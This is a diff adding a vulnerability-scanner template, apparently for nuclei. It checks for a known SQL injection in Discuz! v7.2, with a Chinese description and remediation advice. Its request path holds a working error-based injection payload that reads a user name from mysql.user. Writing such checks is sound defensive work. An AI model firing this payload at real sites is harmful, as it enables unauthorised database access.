@@ -1,0 +1,37 @@
+id: Discuz-V72-SQLi
+info:
+  name: Discuz7.2 SQL注入漏洞
+  author:
+  - l0ne1y
+  description: |-
+    Discuz! v7.2 SQL注入漏洞
+    Discuz!一套通用的社区论坛软件系统。
+
+    Discuz! v7.2存在SQL注入漏洞，攻击者可利用该漏洞执行SQL语句，对数据库中的信息进行查看、添加、修改或删除。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://discuz.net/
+
+    临时修复方案：
+    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
+    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
+    3、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
+    4、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
+    5、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
+    6、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
+requests:
+- matchers:
+  - type: word
+    condition: and
+    words:
+    - 81dc9bdb52d04dc20036dbd8313ed055
+    - 'Discuz! info</b>: MySQL Query Error'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(user,0x3a,md5(1234),0x3a)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23'
+  method: GET
